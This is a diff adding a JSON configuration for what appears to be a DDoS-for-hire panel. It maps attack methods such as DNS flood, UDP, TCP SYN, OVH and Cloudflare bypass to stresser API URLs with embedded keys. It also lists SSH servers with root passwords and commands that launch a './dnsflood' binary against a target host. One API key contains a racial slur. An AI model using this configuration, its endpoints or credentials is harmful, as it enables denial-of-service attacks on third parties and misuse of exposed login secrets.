@@ -1,0 +1,235 @@
+{
+  "hold": {
+    "urls": [
+      {
+        "url": "http://205.185.119.42/api/attack?username=ZOPZHH&key=ZOPZAPIKEY&host={host}&port={port}&time={time}&method=hold"
+      }
+    ],
+    "servers": [
+      {
+        "name": "server1",
+        "host": "185.121.15.45",
+        "port": [
+          22
+        ],
+        "type": "ssh",
+        "username": "root",
+        "password": "a2H3OhB5",
+        "command": "screen -dmS {{session}} ./dnsflood {{host}} {{port}} 1 3000 {{time}}"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 500000,
+    "min_time": 120,
+    "group": "home_holder",
+    "maxConcurrents": 20,
+    "homeholder": true,
+    "enabled": true
+  },
+  "dns": {
+    "urls": [
+      {
+        "url": "https://quartz-api-system.site/api?user=ZOPZ&pass=ZOPZthereal1337heckerlove123&host={host}&port={port}&time={time}&method=DNS"
+      },
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=DNS&concurrents=1"
+      }
+    ],
+    "servers": [
+      {
+        "name": "server1",
+        "host": "213.142.159.192",
+        "port": [
+          22
+        ],
+        "type": "ssh",
+        "username": "root",
+        "password": "2iSoT3D2ca",
+        "command": "screen -dmS {{session}} ./home {{host}} -1 1 {{time}}"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4
+  },
+  "game": {
+    "urls": [
+      {
+        "url": "http://45.131.64.83:888/api/attack?username=zopz&password=change&host={host}&port={port}&time={time}&method=game"
+      },
+      {
+        "url": "https://api.lava-endpoint.im/api?host={host}&port={port}&time={time}&method=U-GAME&key=3949-3823-8334"
+      },
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=UDP-PPS&concurrents=2"
+      },
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=UDPVSE&concurrents=2"
+      },
+      {
+        "url": "http://205.185.119.42/api/attack?username=ZOPZ&key=skidniggerbasicpower&host={host}&port={port}&time={time}&method=udp"
+      },
+      {
+        "url": "https://quartz-api-system.site/api?user=ZOPZ&pass=ZOPZthereal1337heckerlove123&host={host}&port={port}&time={time}&method=VSE"
+      },
+      {
+        "url": "https://api.vacstresser.ru/api?key=27b2000f-a2af-4dcf-b998-6f13843e57c1&host={host}&port={port}&time={time}&method="
+      }
+    ],
+    "ipv4": true,
+    "domain": true,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4
+  },
+  "ovh": {
+    "urls": [
+      { 
+        "url": "http://45.131.64.83:888/api/attack?username=zopz&password=change&host={host}&port={port}&time={time}&method=OVH"
+      },
+      {
+        "url": "http://205.185.119.42/api/attack?username=ZOPZP&key=skidniggerbasicpower&host={host}&port={port}&time={time}&method=private-ovh"
+      },
+      {
+        "url": "http://185.14.92.219:7070/api/attack?username=zopz&secret=ddosheckerskid&host={host}&port={port}&time={time}&method=ovh"
+      },
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=PSHACK&concurrents=2"
+      },
+      {
+        "url": "http://185.35.136.16:8881/api/attack?username=zopz&password=zopz&target={host}&port={port}&time={time}&method=ovh"
+      },
+      {
+        "url": "https://quartz-api-system.site/api?user=ZOPZ&pass=ZOPZthereal1337heckerlove123&host={host}&port={port}&time={time}&method=OVH-TCP"
+      }
+    ],
+    "ipv4": true,
+    "domain": true,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "bypass_network",
+    "maxConcurrents": 1
+  },
+  "http": {
+    "urls": [
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=PRIV-FLOOD&concurrents=2&rate=10&geo=Worldwide"
+      }
+    ],
+    "ipv4": false,
+    "domain": true,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4
+  },
+  "gudp": {
+    "urls": [
+      {
+        "url": "https://api.lava-endpoint.im/api?host={host}&port={port}&time={time}&method=U-GBPS&key=3949-3823-8334"
+      },
+      {
+        "url": "http://185.14.92.219:7070/api/attack?username=zopz&secret=ddosheckerskid&host={host}&port={port}&time={time}&method=gudp"
+      },
+      {
+        "url": "http://205.185.119.42/api/attack?username=ZOPZP&key=skidniggerbasicpower&host={host}&port={port}&time={time}&method=private-udp"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 300,
+    "enabled": true,
+    "vip": true,
+    "group": "bypass_network",
+    "maxConcurrents": 1
+  },
+  "discord": {
+    "urls": [
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=DISCORD&concurrents=2"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4,
+    "vip": true
+  },
+  "tcp": {
+    "urls": [
+      {
+        "url": "http://205.185.119.42/api/attack?username=ZOPZ&key=skidniggerbasicpower&host={host}&port={port}&time={time}&method=tcp"
+      },
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&port={port}&time={time}&method=TCPAMP&concurrents=3"
+      },
+      {
+        "url": "https://quartz-api-system.site/api?user=ZOPZ&pass=ZOPZthereal1337heckerlove123&host={host}&port={port}&time={time}&method=SYN"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4,
+    "vip": true
+  },
+  "bypass": {
+    "urls": [
+      {
+        "url": "https://goliathstress.su/v1/attack?username=ZOPZ&key=YBYS0f8G&target={host}&time={time}&port={port}&method=CLOUDFLARE&concurrents=1&rate=10&geo=Worldwide"
+      }
+    ],
+    "ipv4": false,
+    "domain": true,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4,
+    "vip": true
+  },
+  "stopall": {
+    "urls": [
+      {
+        "url": "https://goliathstress.su/v1/stopall?username=ZOPZ&key=YBYS0f8G"
+      }
+    ],
+    "servers": [
+      {
+        "name": "server1",
+        "host": "185.121.15.45",
+        "port": [
+          22
+        ],
+        "type": "ssh",
+        "username": "root",
+        "password": "a2H3OhB5",
+        "command": "pkill screen"
+      },
+      {
+        "name": "server2",
+        "host": "213.142.159.192",
+        "port": [
+          22
+        ],
+        "type": "ssh",
+        "username": "root",
+        "password": "2iSoT3D2ca",
+        "command": "pkill screen"
+      }
+    ],
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 4,
+    "vip": true
+  }
+}
